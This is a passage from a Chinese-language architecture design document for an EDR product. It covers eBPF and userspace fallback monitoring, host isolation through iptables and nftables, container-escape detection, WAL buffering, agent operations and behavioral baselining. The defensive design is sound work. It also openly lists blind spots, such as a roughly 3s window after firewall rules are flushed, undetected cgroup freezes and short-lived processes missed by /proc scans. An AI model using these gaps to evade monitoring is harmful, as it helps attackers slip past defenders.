└── 验证: Windows 事件采集完整; 规则跨平台复用; PE ML 达标

Phase 24: 规则扩充与持续迭代                                持续迭代
├── 24.1 扩充到 500+ YAML 规则 (Linux + Windows)
├── 24.2 覆盖 100+ MITRE 技术点 (50%)
├── 24.3 规则质量度量 + 自动优化
├── 24.4 蜜罐文件检测
├── 24.5 狩猎查询模板库 / Playbook 模板库扩充
├── 24.6 ML 模型持续迭代 (月度重训)
├── 24.7 多内核版本 CI 验证 (kernel 4.15/5.4/5.15/6.1)
└── 验证: ATT&CK 覆盖度 50%+; 规则+ML 联合检出率达标
```

---

## 十、风险与约束

| 风险 | 影响 | 缓解措施 |
|------|------|---------|
| eBPF 内核兼容性 | 不同内核版本 BPF helper/hook 支持不同 | BPF CO-RE + Hook 优先级探测 (fentry→kprobe，BPF LSM 按需增强) + 用户态降级 |
| Agent CPU 占用过高 | 影响业务进程 | 4 级动态资源降级 (按事件危险等级逐步丢弃，非全量暂停) |
| YARA 扫描延迟 | 同步扫描阻塞进程启动 | 默认 async 先放行后扫描; pre-block 仅限 critical 规则显式启用 + 500ms 超时强制放行 |
| 规则质量 | 社区规则可能引入高误报规则 | JSON Schema 验证 + CI/CD 自动验证 + 质量度量 + 管理员审核 |
| 进程树断链 | Agent 启动前存量进程无父节点 / exit 事件丢失导致僵尸节点 | /proc 初始快照 + 5 分钟定时对账 + 孤儿节点标记 (tree_complete 字段) |
| 进程树内存 | 大规模主机内存增长 | TTL 清理 + 主机数分片到多 Consumer |
| CEL 自定义函数性能 | Redis 调用引入网络延迟 | Pipeline 批量查询 + 本地缓存 |
| cilium/ebpf 学习曲线 | BPF C 代码编写调试难度 | 参考 Tracee/Tetragon BPF 代码 |
| Agent 被攻击者杀死 | 丧失主机监控能力 | Watchdog 自动拉起 + eBPF 信号监控 + Server 心跳超时告警 |
| 用户态模式能力缺失 | 部分高级规则无法运行 | 能力等级声明 + 不兼容规则自动禁用 + 管理后台按模式分组展示 |
| 学习期遗漏真实攻击 | 7 天内不告警可能漏报 | critical 规则 + IOC 碰撞在学习期内仍正常告警 |
| WAL 磁盘占用 | 网络长时间中断导致 WAL 写满磁盘 | 500MB 上限 + 淘汰最旧段 + 磁盘使用率监控 |
| mTLS 证书轮换失败 | Agent 失去与 Server 通信能力 | 到期前 30 天自动轮换 + 旧证书 24h 宽限期 + 手动重签 API |
| 容器运行时兼容性 | 不同运行时 API 差异导致容器上下文缺失 | ContainerRuntime 适配器模式 + 多运行时集成测试 |
| Kafka 分区再平衡 | Consumer 扩缩容期间短暂事件处理延迟 | host_id Key 保证分区亲和性 + 再平衡期间 WAL 兜底 |
| 响应动作误杀 | 规则误报导致批量 kill 业务进程 | 熔断器 (kill > 50/5min 自动熔断) + 灰度发布 + dry_run 验证 |
| Agent 升级回滚 | 新版本存在 bug 影响生产环境 | 灰度分批升级 + 自动健康检查 + 自动回滚到上一版本 |
| 气隙网络规则更新 | 离线环境无法同步最新规则和 IOC | 规则离线包 + 本地 IOC 库 + 管理后台手动导入 |
| 规则冲突 | 多条规则同时命中同一事件产生矛盾动作 | 优先级体系 (emergency > custom > builtin) + 最高动作优先 |
| BDE 基线冷启动 | 7 天内无基线参考，行为检测失效 | 冷启动期 risk_score ×0.5 衰减 + critical 规则不受影响 |
| BDE 误报噪音 | 合法业务变更导致行为偏差告警 | 相同 exe 1h 内只告警一次 + 管理员可配置 score 偏移 |
| 故事线误关联 | 不相关事件被错误关联到同一故事线 | story_id 仅沿进程树传播 + 跨主机关联限时间窗口 ±5min + 上限 20 主机 |
| MQL 查询性能 | 复杂查询拖慢 ClickHouse | 强制时间范围 + 30s 超时 + 并发限制 3/用户 + 慢查询日志 |
| Playbook 误操作 | 自动编排误杀大量业务进程 | 受全局熔断器控制 + 同主机最多 1 个 Playbook + 可随时取消 |
| eBPF 隔离内核依赖 | cgroup BPF 需要 kernel >= 5.7 | 自动降级为 iptables 方案 + 管理后台标注隔离模式 |
| 内存扫描开销 | YARA 扫描大进程内存消耗 CPU/IO | 单次上限 100MB + 5s 超时 + nice 19 + 并发上限 2 |
| ML 模型误判 | 静态 ML 对加壳/变异样本误判 | FPR < 1% 验收标准 + 灰度 shadow 模式 + 信誉兜底 |
| ML 模型对抗 | 攻击者针对模型做对抗样本 | 多引擎交叉验证 (ML+规则+IOC+BDE) + 模型月度重训 |
| ONNX Runtime 内存 | Agent 端模型推理增加内存占用 | 量化 int8 (< 5MB 模型) + 总内存预算控制 |
| 沙箱被绕过 | 恶意软件检测沙箱环境后隐藏行为 | 沙箱仅作辅助判定, 不依赖单一结果; ML+规则+BDE 多层兜底 |
| 情报源可用性 | 外部情报源宕机或限频 | 多源冗余 + 本地缓存 + 源健康监控 + 降级策略 |
| 远程 Shell 安全 | 被攻击者利用反向控制 | mTLS + MFA + 审计录制 + 危险命令拦截 + 会话超时 |
| Windows ETW 兼容 | 不同 Windows 版本 ETW Provider 差异 | 最低支持 Win Server 2016 + ETW 可用性探测 |
| 前端性能 | 大量告警/事件导致前端卡顿 | 虚拟滚动 + 分页 + cursor-based pagination + WebSocket 增量推送 |

---

## 十一、用户态完整降级方案

所有依赖 eBPF 的模块必须有用户态降级方案，确保 CentOS 7 等低版本内核环境下功能可用。

### 11.1 降级能力矩阵

| 模块 | eBPF 模式 | 用户态降级方案 | 能力损失 |
|------|----------|--------------|---------|
| 事件采集 - 进程 | tracepoint | cn_proc (netlink) | 字段少 (cwd/env/tty 需补充) |
| 事件采集 - 文件 | fentry/kprobe | fanotify | 仅 open/close_write |
| 事件采集 - 网络 | fentry/kprobe | /proc/net 轮询 | 5s 延迟 |
| 事件采集 - DNS | kprobe udp_sendmsg | 日志解析 / LD_PRELOAD | 覆盖不完整 |
| 内核态白名单 | BPF Map | 用户态 Bloom Filter | 事件仍拷贝到用户态 |
| 动态资源降级 | config_map | 用户态 level 变量 | 逻辑一致，延迟略高 |
| 主机网络隔离 | cgroup/XDP | iptables + nftables + 巡检 | 攻击者有 ~3s 绕过窗口 |
| 内存操作监控 | tracepoint (memfd/ptrace/mmap) | /proc 定时扫描 | 非实时，10s 采样 |
| Agent 自保 - 信号监控 | tracepoint signal_deliver | Watchdog 双进程互保 | 无法记录谁发的信号 |
| 行为引擎 - syscall 基线 | tracepoint/audit | 不采集 syscall，降级为进程/文件/网络基线 | 丢失 syscall 维度 |

### 11.2 各模块降级详细设计

```
1. 内核态白名单 → 用户态 Bloom Filter
   ─────────────────────────────────────────────────
   eBPF:    BPF Map (LRU_HASH) 在内核态直接丢弃，事件不出内核
   用户态:  事件到达用户态后第一步 Bloom Filter 过滤
            • 预加载白名单 exe_path + comm 到 Bloom Filter
            • 查询 O(1)，< 1μs
            • false positive rate 设为 0.1% (宁可多评估也不漏)
            • 白名单配置与 eBPF 模式共用同一份
            • 效果: 减少 ~60% 后续规则评估开销
              (虽然事件已拷贝到用户态，但省去规则匹配时间)

2. 动态资源降级 → 用户态 level 变量
   ─────────────────────────────────────────────────
   eBPF:    config_map 写入 level → BPF 程序内部按 level 过滤
   用户态:  Agent 进程内维护 degradation_level 全局变量
            • cn_proc 收到事件 → 检查 level → 丢弃低优先级事件
            • fanotify: 通过 fanotify_mark 动态调整监控目录范围
              - Level 1: 移除 /var/log 等低危目录监控
              - Level 2: 仅保留 /tmp /dev/shm /usr/bin 等关键目录
              - Level 3: 停止 fanotify，仅保留 cn_proc
            • /proc/net 轮询间隔动态调整:
              - Level 0: 5s | Level 1: 10s | Level 2: 30s | Level 3: 停止

3. 主机网络隔离 → iptables + nftables + 防篡改巡检
   ─────────────────────────────────────────────────
   eBPF:    cgroup/connect + XDP，攻击者无法从用户态绕过
   用户态:  三层防护

   Layer 1: iptables 规则
     iptables -P INPUT DROP
     iptables -P OUTPUT DROP
     iptables -A INPUT -s {server_ip} -j ACCEPT
     iptables -A OUTPUT -d {server_ip} -j ACCEPT
     iptables -A OUTPUT -p udp --dport 53 -d {dns_ip} -j ACCEPT  # DNS (可选)

   Layer 2: nftables 规则 (双引擎，攻击者需同时清除两套)
     nft add table inet mxsec_isolation
     nft add chain inet mxsec_isolation input { type filter hook input priority 0 \; policy drop \; }
     nft add rule inet mxsec_isolation input ip saddr {server_ip} accept

   Layer 3: 防篡改巡检 (每 3s)
     • 检查 iptables 规则是否完整 (iptables -S | hash 对比)
     • 检查 nftables 规则是否完整 (nft list ruleset | hash 对比)
     • 规则被清除 → 立即重写 + 生成 isolation_tamper 告警
     • 已知局限: iptables -F 到重写之间有 ~3s 窗口

   隔离级别:
     Level 1 (选择性): 封堵特定 IP/端口，业务正常
     Level 2 (标准):   断外网，保留管控 + DNS + 管理员跳板
     Level 3 (完全):   仅保留管控通道

4. 内存操作监控 → /proc 定时扫描
   ─────────────────────────────────────────────────
   eBPF:    实时捕获 memfd_create / ptrace_attach / mmap(PROT_EXEC)
   用户态:  定时扫描 /proc 补偿

   常规扫描 (每 10s，所有进程):
     • /proc/[pid]/maps → 检测匿名可执行区域 (anon + x 权限)
     • /proc/[pid]/status → TracerPid != 0 则被 ptrace 附加
     • /proc/[pid]/fd/ → 存在 memfd: 开头的链接

   加速扫描 (每 2s，仅可疑进程):
     触发条件: first_seen 进程 / 行为引擎高分进程 / 有外连的未知进程
     • 对可疑进程做更频繁的 maps 扫描
     • 发现异常 → 触发 YARA 内存扫描 (/proc/pid/mem)

   已知局限:
     • 非实时: 短命进程 (< 10s) 可能在扫描间隔内执行完毕
     • 无法捕获 mprotect 瞬态变更 (改完又改回来)

5. Agent 自保 - 信号监控 → 双进程互保
   ─────────────────────────────────────────────────
   eBPF:    tracepoint/signal_deliver 记录谁给 Agent 发了什么信号
   用户态:  Watchdog + Agent 双进程互保

   架构:
     Agent Process ←── 1s 心跳 ──→ Watchdog Process
     ↓ 被杀                         ↓ 被杀
     Watchdog 1s 内检测 → 重启      Agent 1s 内检测 → 重启
     ↓ 两个同时被杀
     systemd (Type=notify) 守护重启

   实现:
     • 互保通道: Unix Domain Socket (低开销)
     • 心跳间隔: 1s
     • 检测延迟: 最多 1s (对比 eBPF 的实时)
     • Watchdog 自身极轻量: < 5MB 内存, < 0.1% CPU
     • Watchdog 不做检测，只做守护和自保告警上报

   已知局限:
     • 无法记录攻击者信息 (谁杀的、用什么方式)
     • 被杀到重启之间有 ~1-2s 监控盲区
     • cgroup freeze 攻击无法检测 (进程未死但被冻结)

6. 行为引擎 syscall 基线 → 降级为三维基线
   ─────────────────────────────────────────────────
   eBPF:    4 维行为画像 (子进程 + 文件 + 网络 + syscall)
   用户态:  3 维行为画像 (子进程 + 文件 + 网络)

   降级策略:
     • BehaviorProfile.syscall_available = false
     • risk_score 计算时 syscall 维度权重设为 0
     • 其余三维正常工作:
       - 子进程基线: cn_proc 完整提供
       - 文件基线: fanotify 提供 open/close_write (覆盖面窄但可用)
       - 网络基线: /proc/net 提供连接信息 (5s 粒度)
     • 异常检测灵敏度下降 ~25% (丢失 syscall 维度)
     • 管理后台标注: "该主机行为检测为 3/4 维度模式"
```

### 11.3 用户态模式下的规则自动适配

```
规则 YAML 中通过 requires 字段声明能力依赖:

  id: MXEDR-0099
  name: memfd_fileless_exec
  requires:
    capabilities: [ebpf_memory]    # 需要内存操作监控
  agent:
    enabled: true
    match:
      event_type: memory_exec
      conditions:
        - field: source
          op: equals
          value: "memfd"

  Agent 启动时:
  1. 探测当前运行模式 (eBPF Full / Basic)
  2. 加载规则时检查 requires.capabilities
  3. 当前模式不满足 → 规则标记为 disabled (reason: capability_missing)
  4. 不满足的规则不参与评估，不产生告警
  5. 上报 Server: 哪些规则因能力不足被禁用
  6. 管理后台展示: 每台主机的规则生效率 (已启用/总规则数)

  预定义 capability 列表:
    ebpf_full        — 完整 eBPF 模式
    ebpf_memory      — 内存操作监控 (memfd/ptrace/mmap)
    ebpf_signal      — 信号监控
    ebpf_isolation   — eBPF 网络隔离
    ebpf_syscall     — syscall 基线
    dns_full         — 完整 DNS 采集
    container_ctx    — 容器上下文
    file_full        — 完整文件操作 (rename/unlink/chmod)
```

---

## 十二、容器与 K8s 环境

### 12.1 容器运行时适配

```
┌──────────────────────────────────────────────────────────┐
│  ContainerRuntime 适配层                                  │
│                                                          │
│  自动探测容器运行时 (Agent 启动时):                       │
│  1. 检查 /run/containerd/containerd.sock → containerd    │
│  2. 检查 /run/crio/crio.sock → CRI-O                    │
│  3. 检查 /var/run/docker.sock → Docker                   │
│  4. 检查 /run/podman/podman.sock → Podman                │
│  5. 以上都不存在 → 非容器环境，跳过容器上下文注入        │
│                                                          │
│  容器 ID 获取:                                           │
│    eBPF: task_struct → css → cgroup → 解析 container ID  │
│    用户态: /proc/[pid]/cgroup → 解析 cgroup 路径         │
│      containerd 格式: /system.slice/containerd.service/   │
│        kubepods-xxx/cri-containerd-{container_id}        │
│      Docker 格式: /docker/{container_id}                 │
│      解析后取 container_id (64 位 hex, 截取前 12 位)     │
│                                                          │
│  容器元数据获取 (通过运行时 API):                         │
│    • container_name                                      │
│    • container_image / image_tag                         │
│    • container_status (running/paused/stopped)           │
│    • container_labels                                    │
│    • 缓存: map[container_id]ContainerMeta, TTL 5min      │
│    • API 调用失败 → 仅保留 container_id, 其他字段为空    │
│                                                          │
│  K8s 上下文获取:                                          │
│    方式 1: 读取 Downward API 环境变量 (DaemonSet 部署时)  │
│      pod_name:      env MY_POD_NAME                      │
│      namespace:     env MY_POD_NAMESPACE                 │
│      node_name:     env MY_NODE_NAME                     │
│    方式 2: 查询 Kubelet API (10255/10250)                │
│      GET /pods → 按 container_id 匹配 pod 信息          │
│      获取: pod_name, namespace, deployment, labels,      │
│            service_account, host_network                 │
│    方式 3: /proc/[pid] 内读取                            │
│      /proc/[pid]/mountinfo → 判断 mount namespace        │
│      /var/run/secrets/kubernetes.io/ → service account   │
│    优先级: 方式 1 → 方式 2 → 方式 3                     │
│                                                          │
│  事件注入字段:                                            │
│    container_id, container_name, container_image          │
│    k8s_pod, k8s_namespace, k8s_deployment                │
│    k8s_service_account, k8s_host_network                 │
└──────────────────────────────────────────────────────────┘
```

### 12.2 容器安全检测

```
容器环境特有检测规则:

1. 容器逃逸检测
   eBPF:    监控 mount/unshare/nsenter/setns 系统调用
   用户态:  定时扫 /proc/[pid]/ns/ 变更 + 检测 nsenter 进程

   规则:
   • 容器内进程 mount host 路径 → 逃逸尝试
   • 容器内进程 nsenter 到 host namespace → 逃逸
   • 容器进程 /proc/1/root 访问 → 检查是否越权到宿主

2. 特权容器告警
   • 检测 container_labels 中 privileged=true
   • 检测 /proc/[pid]/status 中 CapEff 全 f → 特权模式
   • 特权容器内的可疑行为提升告警级别

3. 容器感知白名单
   • 白名单支持按 namespace/deployment 配置
   • kube-system namespace 下的系统组件自动白名单
   • 规则条件支持: k8s_namespace != "production"

4. Agent 部署模式
   DaemonSet 部署 (推荐):
     • 以特权容器运行
     • 挂载: hostPID=true, hostNetwork=true
     • 挂载卷: /proc, /sys, /var/lib/mxsec (规则缓存)
     • eBPF: 挂载 /sys/fs/bpf
     • 一个 DaemonSet 覆盖整个节点所有容器
```

---

## 十三、事件可靠性与数据安全

### 13.1 Agent 端事件缓冲 (WAL)

```
┌──────────────────────────────────────────────────────────┐
│  事件缓冲架构 (Write-Ahead Log)                           │
│                                                          │
│  事件产生                                                │
│    ↓                                                     │
│  规则评估 + 标记                                         │
│    ↓                                                     │
│  写入 WAL 文件 (本地磁盘)  ← 同步写入，保证持久化       │
│    ↓                                                     │
│  后台 sender 协程读取 WAL → 发送到 Kafka                 │
│    ↓ 发送成功                                            │
│  标记 WAL 记录已消费 → 定时清理已消费记录                │
│                                                          │
│  WAL 存储:                                               │
│    路径: /var/lib/mxsec/wal/                             │
│    格式: 按时间分段文件, 每段 10MB                       │
│    磁盘上限: 可配置 (默认 500MB)                         │
│    超限策略: 丢弃最旧未发送段 + 生成 event_loss 指标     │
│                                                          │
│  网络断开场景:                                            │
│    • Kafka 不可达 → sender 协程暂停 → WAL 持续写入      │
│    • 网络恢复 → sender 从上次位置继续发送                │
│    • 追补速率限制: 防止恢复后瞬间打爆 Kafka              │
│                                                          │
│  Agent 崩溃恢复:                                          │
│    • 重启后扫描 WAL 目录                                 │
│    • 找到未消费的记录 → 继续发送                         │
│    • 最多丢失崩溃瞬间最后一个 write batch (< 1s 数据)    │
│                                                          │
│  性能:                                                   │
│    • 写入: 顺序追加, < 100μs/event                      │
│    • 磁盘 I/O: ~2MB/s (400 EPS × ~5KB/event)            │
│    • 内存: sender 缓冲区 10MB                            │
└──────────────────────────────────────────────────────────┘
```

### 13.2 事件乱序处理

```
问题: Kafka 只保证单 partition 内有序，跨 partition 可能乱序

解决方案:
  1. 路由策略: Kafka producer key = host_id
     → 同一主机所有事件进入同一 partition
     → 单主机内事件严格有序

  2. Agent 时间戳: 每个事件携带 agent_timestamp (纳秒精度)
     → Server 端按 agent_timestamp 排序，不依赖 Kafka 时间

  3. 序列检测器乱序容忍:
     → 事件到达后不立即评估序列
     → 等待 reorder_window (默认 5s) 后再评估
     → 5s 窗口内到达的事件按 agent_timestamp 排序后评估
     → 代价: 序列检测延迟增加 5s (可接受)

  4. 跨主机事件:
     → 不同主机的事件不保证顺序 (也不需要)
     → 故事线引擎跨主机关联时使用 agent_timestamp 对齐
```

### 13.3 通信安全

```
Agent ↔ Server 通信加固:

  1. mTLS 双向认证
     • Server 端内置 CA (Ed25519)
     • Agent 首次注册:
       - Agent 生成 CSR → 提交 Server
       - Server 签发客户端证书 → 返回 Agent
       - 后续 gRPC 连接使用双向 TLS
     • 证书有效期: 90 天
     • 自动轮换: 到期前 7 天 Agent 自动申请新证书
     • 证书吊销: Server 维护 CRL，Agent 被注销时吊销证书

  2. 规则完整性验证
     • Server 对规则包签名 (Ed25519)
     • 签名内容: 规则内容 + 版本号 + 时间戳
     • Agent 验签后才加载规则
     • 签名不匹配 → 拒绝加载 + 上报 rule_tamper 告警
     • 防止中间人篡改规则 (例如删除关键检测规则)

  3. 敏感字段脱敏
     • Agent 端发送前脱敏，敏感数据不出主机
     • 脱敏规则 (正则匹配 + 替换):
       - cmdline: password=xxx / --token=xxx → password=*** / --token=***
       - env: AWS_SECRET_ACCESS_KEY=xxx → AWS_SECRET_ACCESS_KEY=***
       - env: MYSQL_PASSWORD=xxx → MYSQL_PASSWORD=***
     • 内置脱敏正则列表 + 支持管理员自定义
     • 脱敏日志: 记录脱敏了哪些字段 (不记录原文)
```

---

## 十四、运维体系

### 14.1 Agent 生命周期管理

```
1. Agent 注册
   ─────────────────────────────────────────────────
   首次安装:
     • Agent 生成唯一 agent_id (UUID v4, 持久化到 /var/lib/mxsec/agent_id)
     • 采集主机信息: hostname, IP, OS, kernel, arch, CPU/MEM/DISK
     • 向 Server 注册: POST /api/v1/agents/register
     • Server 颁发 mTLS 证书 + 分配配置 + 推送规则
     • 注册成功 → Agent 进入学习期 (7 天)

   重复注册保护:
     • 相同 agent_id 重复注册 → Server 更新主机信息，不新建记录
     • 不同 agent_id 但相同 hostname+IP → Server 标记提醒管理员

2. Agent 升级
   ─────────────────────────────────────────────────
   流程:
     Server 发布新版本 → Agent 心跳时获知新版本可用
     → Agent 下载新版本二进制 (HTTP + SHA256 校验)
     → 保留旧版本备份 (agent.bak)
     → 优雅关闭:
       1. 停止事件采集 (卸载 eBPF 程序 / 关闭 fanotify)
       2. 刷出 WAL 缓冲 (最多等 5s)
       3. 等待进行中的 YARA 扫描完成 (最多 5s)
       4. 上报 agent_upgrading 事件
       5. 退出
     → systemd 拉起新版本进程
     → 新版本启动: /proc 快照 + 规则加载 + eBPF attach
     → 启动成功 → 上报 agent_upgraded 事件
     → 启动失败 (3 次) → 自动回滚到 agent.bak

   升级策略:
     • 分批升级: 按主机组灰度，5% → 20% → 50% → 100%
     • 升级窗口: 可配置 (例如仅凌晨 2:00-5:00)
     • 强制升级: 安全漏洞时管理员可跳过灰度

3. Agent 注销
   ─────────────────────────────────────────────────
   管理员在后台删除主机:
     → Server 下发注销指令 (gRPC)
     → Agent 收到:
       1. 卸载 eBPF 程序
       2. 清理规则缓存 /var/lib/mxsec/rules/
       3. 清理 WAL /var/lib/mxsec/wal/
       4. 删除证书
       5. 保留 agent_id 文件 (支持重新注册)
       6. 上报 agent_unregistered → 退出
     → Server 标记主机为 unregistered，保留历史数据
```

### 14.2 Agent 健康度监控

```
每次心跳 (默认 30s) 上报:

{
  "agent_id": "xxx",
  "timestamp": "2026-05-15T10:00:00Z",
  "health": {
    "cpu_percent": 2.3,
    "mem_rss_mb": 42,
    "degradation_level": 0,
    "collect_mode": "ebpf_full",
    "hook_type": "fentry",
    "events_per_sec": 380,
    "rules_loaded": 185,
    "rules_disabled": 15,
    "rules_disabled_reasons": {"capability_missing": 12, "admin_disabled": 3},
    "eval_latency_p50_us": 18,
    "eval_latency_p99_us": 95,
    "wal_buffer_used_mb": 0.3,
    "wal_events_pending": 120,
    "events_dropped_total": 0,
    "yara_scans_total": 47,
    "yara_scans_blocked": 0,
    "isolation_status": "none",
    "uptime_seconds": 864000,
    "version": "1.2.0"
  }
}

Server 端健康度判定:
  • cpu_percent > 8% 持续 5 分钟 → 告警: agent_high_cpu
  • mem_rss_mb > 80 → 告警: agent_high_memory
  • degradation_level > 0 → 告警: agent_degraded
  • events_dropped_total 递增 → 告警: agent_event_loss
  • wal_buffer_used_mb > 400 → 告警: agent_buffer_full
  • 心跳超时 3 分钟 → 告警: agent_offline
  • 心跳超时连续 3 次 → 升级为 critical
```

### 14.3 管理后台健康大盘

```
Dashboard 页面:

  ┌─────────────────────────────────────────────────────────┐
  │  主机总览                                                │
  │  在线: 892  离线: 8  隔离中: 2  学习期: 15              │
  │  eBPF Full: 780  Basic: 112  降级中: 3                  │
  ├─────────────────────────────────────────────────────────┤
  │  告警趋势 (最近 7 天)                    活跃故事线      │
  │  ████████████░░  Critical: 3             #S-1247 进行中 │
  │  ████████░░░░░░  High: 12               #S-1245 已关闭 │
  │  ████░░░░░░░░░░  Medium: 47             #S-1232 已升级 │
  ├─────────────────────────────────────────────────────────┤
  │  规则命中 Top 10                 行为异常 Top 10         │
  │  1. MXEDR-0042  1847 次          1. host-092 score:95   │
  │  2. MXEDR-0001   234 次          2. host-017 score:87   │
  │  3. MXEDR-0078    89 次          3. host-155 score:82   │
  ├─────────────────────────────────────────────────────────┤
  │  Consumer 状态                                          │
  │  实例 1: 120K EPS | lag: 200 | 进程树: 42MB            │
  │  实例 2: 118K EPS | lag: 150 | 进程树: 45MB            │
  │  Redis: 连接 48/100 | 内存 2.1GB                       │
  │  ClickHouse: 写入 380K rows/s | 磁盘 45%               │
  └─────────────────────────────────────────────────────────┘
```

---

## 十五、规则执行与大规模部署

### 15.1 规则执行边界情况

```
1. 规则冲突解决
   ─────────────────────────────────────────────────
   同一事件命中多条规则，动作不同:
     优先级排序: kill > isolate > quarantine > block_ip > alert
     执行策略: 执行最高优先级动作 + 记录所有命中规则
     示例: 规则 A (alert) + 规则 B (kill) → 执行 kill，告警中记录 A+B

2. 响应动作失败处理
   ─────────────────────────────────────────────────
   每个动作的失败处理:
     kill 失败:
       • 原因: 进程已退出 / 权限不足 / PID 复用
       • 处理: 重试 1 次 (500ms 后) → 仍失败则记录 action_failed
     quarantine 失败:
       • 原因: 磁盘满 / 文件被占用 / 权限不足
       • 处理: 尝试 chmod 000 降权 → 仍失败则 kill 进程 + 告警
     block_ip 失败:
       • 原因: iptables/nftables 规则数上限
       • 处理: 清理最旧的过期规则 → 重试
     isolate 失败:
       • 原因: eBPF attach 失败 / iptables 写入失败
       • 处理: 降级到下一层隔离方式 → 告警通知管理员

   动作审计日志:
     每个动作执行记录: 触发规则 / 时间 / 目标 / 结果 / 耗时
     存储: 本地 WAL + 上报 Server + ClickHouse 长期保存

3. 紧急停止开关
   ─────────────────────────────────────────────────
   防止规则误报导致大面积 kill 业务进程:

   自动熔断:
     • 单规则 5 分钟内触发 kill > 50 次 → 自动降级为 alert
     • 单主机 5 分钟内 kill > 20 个不同进程 → 暂停该主机所有 kill 动作
     • 全局 5 分钟内 kill > 200 次 → 暂停所有 kill 动作
     • 熔断后: 上报 circuit_breaker_triggered 告警 + 通知管理员

   手动停止:
     • 全局 kill switch: Server API 一键禁用所有响应动作 (仅保留 alert)
     • 单规则禁用: API + 管理后台一键禁用
     • 效果: 30s 内通过心跳下发到所有 Agent

   恢复:
     • 自动熔断 30 分钟后自动恢复
     • 手动停止需管理员手动恢复
     • 恢复前发送确认通知
```

### 15.2 大规模部署

```
Server 水平扩展架构:

  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  Agent 集群 (N 台主机)                                   │
  │    ↓ Kafka (key = host_id)                               │
  │                                                          │
  │  Consumer Group (M 个实例, 自动负载均衡):                 │
  │  ┌──────────┐ ┌──────────┐ ┌──────────┐                │
  │  │Consumer 1│ │Consumer 2│ │Consumer M│                │
  │  │host 1~333│ │host 334~ │ │host 667~ │                │
  │  │          │ │     666  │ │    1000  │                │
  │  │进程树分片│ │进程树分片│ │进程树分片│                │
  │  │故事线分片│ │故事线分片│ │故事线分片│                │
  │  └────┬─────┘ └────┬─────┘ └────┬─────┘                │
  │       └────────────┼────────────┘                       │
  │                    ↓                                     │
  │  ┌─────────────────────────────────────┐                │
  │  │ 共享存储                             │                │
  │  │ Redis Cluster: IOC + 行为画像 + 频率 │                │
  │  │ MySQL: 告警 + 规则 + 配置            │                │
  │  │ ClickHouse Cluster: 原始事件 + 狩猎  │                │
  │  └─────────────────────────────────────┘                │
  │                                                          │
  │  Manager (无状态, 多实例 + LB):                          │
  │  ┌──────────┐ ┌──────────┐                              │
  │  │Manager 1 │ │Manager 2 │ ... (API + Web)              │
  │  └──────────┘ └──────────┘                              │
  │                                                          │
  │  AgentCenter (gRPC, 多实例 + LB):                        │
  │  ┌──────────┐ ┌──────────┐                              │
  │  │  AC 1    │ │  AC 2    │ ... (心跳 + 规则下发)        │
  │  └──────────┘ └──────────┘                              │
  └──────────────────────────────────────────────────────────┘

  扩展指南:
    1000 主机:   1 Consumer, 1 Manager, 1 AC
    5000 主机:   3 Consumer, 2 Manager, 2 AC
    10000 主机:  5 Consumer, 3 Manager, 3 AC, Redis Cluster
    50000+ 主机: 按需扩展 Consumer, ClickHouse 分片

  Consumer 故障恢复:
    • Consumer 崩溃 → Kafka Consumer Group 自动 rebalance
    • 新 Consumer 接管 partition → 从 Kafka 重新消费
    • 进程树丢失 → 等待 Agent 心跳 + /proc 快照重建
    • 重建期间 (~5 分钟): ancestor_has() 返回 unknown，不漏不误

  规则灰度发布:
    • 新规则标记 rollout_percent: 5 → Server 只下发给 5% 主机
    • 灰度主机选择: 按 host_id hash 取模，保证每次灰度一致
    • 灰度期间: 规则以 dry_run 模式运行 (评估但不执行动作)
    • 24h 无误报 → 扩大到 50% → 100% + 启用动作
    • 灰度期间的命中数据可在管理后台查看
```

### 15.3 离线与高可用

```
1. 离线 / 气隙环境
   ─────────────────────────────────────────────────
   规则更新:
     • embed.FS 内置规则保证完全离线可用
     • 离线更新包: 管理员导出规则包 (tar.gz + 签名)
       → 物理介质传入气隙网络 → 上传 Server → 验签 → 分发
     • 离线 IOC 更新: 同样导出 CSV → 手动导入 Redis

   Agent 离线运行:
     • 本地规则缓存保证断网后仍可检测
     • WAL 缓冲事件，网络恢复后追补
     • IOC 碰撞: Agent 端可选本地 IOC 缓存 (SQLite)

2. 高可用设计
   ─────────────────────────────────────────────────
   各组件 HA 方案:
     Manager:     无状态 → 多实例 + Nginx LB
     AgentCenter: 无状态 → 多实例 + LB, Agent 端连接重试
     Consumer:    有状态 → Kafka Consumer Group 自动故障转移
     Kafka:       多 Broker + 副本因子 >= 2
     Redis:       Sentinel (小规模) / Cluster (大规模)
     MySQL:       主从复制 + 自动切换 (ProxySQL/Orchestrator)
     ClickHouse:  分布式表 + ReplicatedMergeTree

   SLA 目标:
     事件采集: Agent 端 99.9% 可用 (单点, systemd 守护)
     事件传输: 99.95% (Kafka + WAL 双保障)
     检测引擎: 99.9% (Consumer Group 自动恢复, < 5 min RTO)
     管理后台: 99.9% (Manager 多实例)

3. 多租户预留
   ─────────────────────────────────────────────────
   v1 不实现多租户，但数据模型预留:
     • 所有核心表增加 tenant_id 字段 (默认值 "default")
     • API 层增加 tenant_id 参数 (v1 忽略)
     • 规则支持按 tenant 隔离 (v1 不隔离)
     • v2 启用多租户时: 加 tenant_id 过滤即可，无需迁移
```

---

## 十六、行为检测引擎 (BDE)

商业 EDR 的核心差异化能力。不依赖已知特征，通过建立进程正常行为画像，检测统计偏差来发现未知威胁。

### 16.1 架构总览

```
┌──────────────────────────────────────────────────────────┐
│              行为检测引擎 (Behavioral Detection Engine)    │
│                                                          │
│  数据流:                                                  │
│  事件流 ──→ 行为画像更新 ──→ 偏差计算 ──→ 风险评分      │
│              ↑                                ↓          │
│         基线快照 (7 天)              risk_score > 阈值    │
│                                        → 生成告警        │
│                                                          │
│  运行位置:                                                │
│    Agent 端: 实时行为统计 + 本地画像维护                   │
│    Server 端: 跨主机基线对比 + 异常聚合 + 风险评分决策    │
└──────────────────────────────────────────────────────────┘
```

### 16.2 四维行为画像

```
每个监控对象 (以 exe_path 为 key) 维护 BehaviorProfile:

┌──────────────────────────────────────────────────────────┐
│  BehaviorProfile                                          │
│                                                          │
│  维度 1: 子进程画像 (ChildProcessProfile)                 │
│  ─────────────────────────────────────────────────────── │
│  • 常见子进程 exe 集合 + 频率                             │
│  • 子进程创建速率 (次/分钟)                               │
│  • 典型子进程树深度                                       │
│  • 示例: nginx 正常只 fork worker，突然 spawn bash → 异常│
│                                                          │
│  维度 2: 文件访问画像 (FileAccessProfile)                 │
│  ─────────────────────────────────────────────────────── │
│  • 常见访问路径前缀集合 (Top 50)                         │
│  • 读/写比例                                              │
